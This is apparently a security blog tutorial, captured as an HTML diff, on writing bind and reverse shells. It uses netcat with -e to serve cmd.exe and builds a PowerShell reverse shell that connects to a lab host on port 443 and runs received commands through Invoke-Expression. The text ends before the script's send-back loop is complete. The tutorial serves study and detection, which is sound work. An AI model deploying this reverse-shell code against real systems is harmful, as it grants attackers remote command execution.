@@ -1,0 +1,763 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Reverse shells: Learn by writing - $ Bit escape</title>
+<meta name="description" content="A shell, its probably the goal of every security researcher, almost every critical flaws or 0-Day exploits give us a way to run a remote command inside a system (RCE - Remote Code Execution).">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="$ Bit escape">
+<meta property="og:title" content="Reverse shells: Learn by writing">
+<meta property="og:url" content="https://aandersonl.github.io/programming/cybersec/powershell/reverse-shells-write-and-hunt-part-1/">
+
+
+  <meta property="og:description" content="A shell, its probably the goal of every security researcher, almost every critical flaws or 0-Day exploits give us a way to run a remote command inside a system (RCE - Remote Code Execution).">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2020-06-14T21:31:36+00:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://aandersonl.github.io/programming/cybersec/powershell/reverse-shells-write-and-hunt-part-1/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "https://aandersonl.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="$ Bit escape Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          $ Bit escape
+          <span class="site-subtitle">It's good to see you here :)</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/programming/">Programming</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/cybersec/">Cybersec</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Reverse shells: Learn by writing">
+    <meta itemprop="description" content="A shell, its probably the goal of every security researcher, almost every critical flaws or 0-Day exploits give us a way to run a remote command inside a system (RCE - Remote Code Execution).">
+    <meta itemprop="datePublished" content="2020-06-14T21:31:36+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Reverse shells: Learn by writing
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2020-06-14T21:31:36+00:00">June 14, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          15 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#bind-shell">Bind shell</a>
+    <ul>
+      <li><a href="#the-idea-behind-remote-shells-with-netcat">The idea behind remote shells with netcat</a></li>
+      <li><a href="#practical-example">Practical example</a></li>
+      <li><a href="#running-cmdexe-over-network">Running cmd.exe over network</a></li>
+    </ul>
+  </li>
+  <li><a href="#reverse-shell">Reverse shell</a>
+    <ul>
+      <li><a href="#using-netcat">Using netcat</a></li>
+    </ul>
+  </li>
+  <li><a href="#powershell-scripting">Powershell scripting</a>
+    <ul>
+      <li><a href="#reverse-shell-implementation">Reverse shell implementation</a></li>
+      <li><a href="#understanding-expressions">Understanding expressions</a>
+        <ul>
+          <li><a href="#eval-expressions-in-python">Eval Expressions in python</a></li>
+        </ul>
+      </li>
+      <li><a href="#continuing-the-code">Continuing the code</a></li>
+      <li><a href="#testing">Testing</a></li>
+    </ul>
+  </li>
+  <li><a href="#encrypted-shells">Encrypted shells</a>
+    <ul>
+      <li><a href="#tlsssl">TLS/SSL</a>
+        <ul>
+          <li><a href="#certificate-creation">Certificate creation</a></li>
+          <li><a href="#encrypted-channel-with-socat">Encrypted channel with SOCAT</a></li>
+          <li><a href="#ssl-stream-in-powershell">SSL stream in Powershell</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <p>A shell, its probably the goal of every security researcher, almost every critical flaws or 0-Day exploits give us a way to run a remote command inside a system (RCE - Remote Code Execution).</p>
+
+<p>Before copy and paste, we need to have a solid knowledge of what we are trying to reach, my goal here is to show ways that we can achieve a bind or a reverse shell and how do you detect this kind of threat.</p>
+
+<h1 id="bind-shell">Bind shell</h1>
+
+<p>The word <strong><em>bind</em></strong> means that your system is <strong><em>listening</em></strong> for something, any incoming connection or any event that may trigger some action, the bind keyword is used in a lot of areas, you can have a bind function that wait for some input and will execute something based in that input.</p>
+
+<p>A bind shell, it’s when your system invoke your shell when some event comes, if we want to reach this over a network, we need a way to make this possible, and what event we can use to trigger this command line ? Yep, we can open a network port and wait for any connection, or wait for some kind of code (take a look at <a href="https://en.wikipedia.org/wiki/Port_knocking">Port knocking</a>), so our goal here it’s very simple, open a port inside our system and <strong><em>bind</em></strong> the incoming packets to our shell.</p>
+
+<h2 id="the-idea-behind-remote-shells-with-netcat">The idea behind remote shells with netcat</h2>
+
+<p>Netcat its a tool for Network operations, mostly used in troubleshooting and for simple packet transfer operations, it allows you to listen in a port, connect to a remote host in a specifc port and also allows custom payloads in your tcp packets. We will use this only for educational purpose, because there is a few real world use for this as a shell.</p>
+
+<h2 id="practical-example">Practical example</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\User\Documents&gt; nc google.com 80
+GET / HTTP/1.0
+Host: www.google.com
+</code></pre></div></div>
+
+<p>Netcat is also called as nc, it comes by default in some Linux distributions and Windows versions, most recently Windows <strong><em>do not</em></strong> have Netcat, but for educational purpose you can install <a href="https://sourceforge.net/projects/nc110/">easily</a>.</p>
+
+<p>The command above, opens a connection into google.com at port 80 but with any data, we need pass to netcat any data we may want to, in this case I wrote a simple GET request to google itself, if you run that you will get a raw html response from google, the same way you would receive if you run curl or something like that.</p>
+
+<p>Ok, netcat also allows us to listen for connections:</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/reverse_shell/simple_chat.png" alt="" /></p>
+
+<p>On the left terminal, I’m starting netcat with <strong><em>-l</em></strong> (listen), <strong><em>-n</em></strong> (Do not resolve names), <strong><em>-v</em></strong> (verbose) and <strong><em>-p</em></strong> (port). If you run this on Windows, the firewall pop-up will ask you for allows the connection (You can create a new firewall rule from cmd using netsh, take look in that :D ).</p>
+
+<p>On the right terminal, I am using the previously command to connect to our localhost machine and to send data.</p>
+
+<p>You can look for the whole options inside <a href="http://sysunconfig.net/unixtips/netcat_readme.html">Netcat</a>, but for we create our bind/remote shell we will need the <strong><em>-e</em></strong> argument, this is for sure the most dangerous argument from netcat, sometimes this argument is not enabled by default and you will need to rebuild the source with GAPING_SECURITY_HOLE macro.</p>
+
+<p>This options allows netcat to run a program in the response, this is used if you want to “serve” your software over the network, let’s take a look in this simple say hello program.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">something</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Hello"</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">something</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">something</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If we want to serve this program over the network we can use the -e for it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lnvp 3333 -e ./sayhello 
+</code></pre></div></div>
+<p>And from another computer you can look for this service and receive the output of this program.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc localhost 3333                                                        
+85 # Our input
+Hello # Remote output
+85 # Remote output
+</code></pre></div></div>
+
+<p>So yeah, this function can be “useful”, but if we can exec a software over netcat, we can exec our cmd or sh and interact from the same way we did before.</p>
+
+<h2 id="running-cmdexe-over-network">Running cmd.exe over network</h2>
+
+<p>This is not anymore a real world scenario, but it’s a good way to illustrate how we can achieve and detect bind shells over our Network.</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/reverse_shell/bind_shell_cmd_nc.png" alt="" /></p>
+
+<p>So netcat is listening for some connection at 3333 and binding everything to our cmd, this is, at its core, a <strong><em>bind shell</em></strong>.</p>
+
+<h1 id="reverse-shell">Reverse shell</h1>
+
+<p>After understanding the idea behind the bind shell and raw socket connections, reverse shell is pretty easy, its exactly the opposite of a bind shell, instead from listen from incoming connections and exec something we will <strong><em>connect</em></strong> to a remote host and send our data to him. Easy to pick up this now, huh ?</p>
+
+<h2 id="using-netcat">Using netcat</h2>
+
+<p>Look how this works:</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/reverse_shell/reverse_shell_nc.png" alt="" /></p>
+
+<p>Altrough this is a very simple approach, it’s a essential concept to pick it up, because now we will dive into a more powerfull way to get remote shells writing our own <strong><em>Powershell</em></strong> implementation of this.</p>
+
+<h1 id="powershell-scripting">Powershell scripting</h1>
+
+<p>Powershell is a rich script language from Microsoft, that give us access to almost everything inside a Windows system, its mostly used for System management and in Server configuration (think that powershell has the same power that shell script has in Linux) and as it is written on top of .Net Framework, so we can access his features inside our script!</p>
+
+<p>You don’ need to be a expert in Powershell and programming to understand a reverse shell written in Powershell, you just need to have basic programming concepts and take a look in a <a href="https://docs.microsoft.com/en-us/powershell/scripting/samples/viewing-object-structure--get-member-?view=powershell-7">quick tutorial</a>.</p>
+
+<p>First, let’s define our scope based in everything said before, we will need:</p>
+<ul>
+  <li>Connect to a remote host</li>
+  <li>Receive data</li>
+  <li>Run inside our Powershell</li>
+  <li>Process output</li>
+  <li>Send back</li>
+</ul>
+
+<p>We need create each of this steps in Powershell scripting, so let’s begin.</p>
+
+<h2 id="reverse-shell-implementation">Reverse shell implementation</h2>
+<p>To make a connection in some host, we will need create a socket, a TCP socket exactly, and this is available in .Net namespaces, more precisely in <strong><em>[System.Net.Sockets.TcpClient]</em></strong>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The <strong><em>New-Object</em></strong> directive allows us to create an object type in our memory, this has the same use of the <strong><em>new</em></strong> keyword, but here this create a .Net object in our Powershell script which allows us to access his features just like we are programming C# using .Net, this give us the ability to call TCPClient methods, take a look in this <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=netcore-3.1">C# tutorial</a>, you will see that we are able to call exactly the same methods here, so let’s connect to this target at this port!</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="o">=</span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$port</span><span class="p">);</span><span class="w">
+</span><span class="c"># Our code go here</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
+</span></code></pre></div></div>
+
+<p>In our “attacker” machine I will use <a href="http://www.dest-unreach.org/socat/">Socat</a> instead Netcat, because this give us a lot of new options that Netcat will no support, such as fork connections to allow multiple connections, create an SSL Channel and so on.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>socat <span class="nt">-d</span> <span class="nt">-d</span> TCP4-LISTEN:443,fork STDOUT
+</code></pre></div></div>
+<p>This will open our 443 for multiple TCP connections and will print everything in our stdout, the <strong><em>-d</em></strong> is the debug level, so if you run the Powershell script command above, I will get something like that in our Linux:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo socat -d -d TCP4-LISTEN:443,fork STDOUT
+2020/05/21 15:22:41 socat[1684] N listening on AF=2 0.0.0.0:443
+2020/05/21 15:22:43 socat[1684] N accepting connection from AF=2 172.16.110.131:1315 on AF=2 172.16.110.129:443
+2020/05/21 15:22:43 socat[1684] N forked off child process 1685
+2020/05/21 15:22:43 socat[1684] N listening on AF=2 0.0.0.0:443
+2020/05/21 15:22:43 socat[1685] N using stdout for reading and writing
+2020/05/21 15:22:43 socat[1685] N starting data transfer loop with FDs [6,6] and [1,1]
+2020/05/21 15:22:43 socat[1685] N socket 1 (fd 6) is at EOF
+2020/05/21 15:22:44 socat[1685] N exiting with status 0
+2020/05/21 15:22:44 socat[1684] N childdied(): handling signal 17
+</code></pre></div></div>
+
+<p>Ok, so this is enough to create our channel between our <a href="https://en.wikipedia.org/wiki/Command_and_control">C2</a>, now we need to able to exchange data between the two sides.</p>
+
+<p>We need a buffer to receive any data that we will send to our Powershell script, in order words, we need a Byte Array to save every byte that we send, this can be acomplished by creating a simple vector in Powershell:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="o">=</span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$port</span><span class="p">)</span><span class="w">
+
+</span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w"> </span><span class="c"># Here</span><span class="w">
+
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Take a look at <a href="https://ss64.com/ps/syntax-arrays.html">Powershell Arrays</a>, the %{} operator, give us a shortcut to use <strong><em>foreach</em></strong>, so basically I am get a 4K buffer and putting in every byte the value 0xFF (255). Now we need a way to read the stream of our tcpclient, that stream is all the data that are flowing to our socket:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="o">=</span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$port</span><span class="p">)</span><span class="w">
+
+</span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
+</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();</span><span class="w">
+
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now, with this Stream, we can access the <strong><em>read</em></strong> method, which will read any data in our socket and save in some buffer, we will send our <strong><em>$buff</em></strong> variable to this and his length.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="o">=</span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$port</span><span class="p">)</span><span class="w">
+
+</span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
+</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
+
+</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+
+</span><span class="nf">Write-Host</span><span class="w"> </span><span class="nv">$buff</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"> </span><span class="c"># For debugging</span><span class="w">
+
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Note that we have <strong><em>Write-Host</em></strong> here, we print the first value of our buff, this value will be the first byte itself we sent, but to execute something in our system we need that the command be in plain text, so we need decode this value into a char, or better, decode a range of bytes in our buffer into a string, for this type of decoding we will use the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.text.asciiencoding?view=netcore-3.1">.Net Text Namespace</a>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="o">=</span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$port</span><span class="p">)</span><span class="w">
+
+</span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
+</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
+
+</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+
+</span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetString</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$size</span><span class="p">);</span><span class="w">
+
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
+</span></code></pre></div></div>
+<p>What we did here was, from the ASCIIEnconding Namespace, select the class ASCII and call his static method GetString from my $buff starting from the index 0 until we reach our $size,
+now our <strong><em>$command</em></strong> variable holds the decoded string, if we send “Hello world” this variable will hold this text.</p>
+
+<h2 id="understanding-expressions">Understanding expressions</h2>
+
+<p>Ok, before we continue our script it’s very important to understand <strong><em>Expressions</em></strong> calls.</p>
+
+<p>There is a few languages that give us the capalities to evaluate some kind of expression in raw string, and run the command itself, like: Javascript(eval), Python(eval), PHP(eval)… A lot of langs call this function as <strong><em>eval</em></strong>, so what this really do ? Take a look at this python example:</p>
+
+<h3 id="eval-expressions-in-python">Eval Expressions in python</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">command</span> <span class="o">=</span> <span class="s">"print('Hello world')"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">eval</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+<span class="n">Hello</span> <span class="n">world</span>
+</code></pre></div></div>
+
+<p>As you can see, our Python interpreter is also capable to read raw strings and interpret in real time, this is also possible in Powershell using the cmdlet <strong><em>Invoke-Expression</em></strong> or shorter <strong><em>iex</em></strong>.</p>
+
+<h2 id="continuing-the-code">Continuing the code</h2>
+
+<p>Take a look in this simple example and try to understand it:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$helloCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Write-Host Hello eval!"</span><span class="p">;</span><span class="w">
+</span><span class="nf">Invoke-Expression</span><span class="w"> </span><span class="nv">$helloCode</span><span class="p">;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>It’s the same idea here, our invoke-expression will interpret and execute our string that is passed! But let’s try to associate this output with some kind of variable</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">Invoke-Expression</span><span class="w"> </span><span class="nv">$helloCode</span><span class="p">;</span><span class="w">
+</span><span class="nf">Write-Host</span><span class="w"> </span><span class="nv">$response</span><span class="p">;</span><span class="w">
+</span></code></pre></div></div>
+<p>This above, will not work because the Invoke-Expression response is a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.psobject?view=powershellsdk-7.0.0">PSObject Class</a>, that is a generic object type, you can look futher for their inside attributes, but there is a faster way to get this with <strong><em>Out-String</em></strong> cmdlet, this will be called using pipes and will get string value (just like toString()) and return to us, that way we can get the string value itself.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">Invoke-Expression</span><span class="w"> </span><span class="nv">$helloCode</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-String</span><span class="p">;</span><span class="w">
+</span><span class="nf">Write-Host</span><span class="w"> </span><span class="nv">$response</span><span class="p">;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now let’s add that in our original code:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="o">=</span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$port</span><span class="p">)</span><span class="w">
+
+</span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
+</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
+
+</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+
+</span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetString</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$size</span><span class="p">);</span><span class="w">
+
+</span><span class="nv">$command_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">iex</span><span class="w"> </span><span class="nv">$command</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-String</span><span class="p">;</span><span class="w"> </span><span class="c"># Invoke-Expression shorten</span><span class="w">
+
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
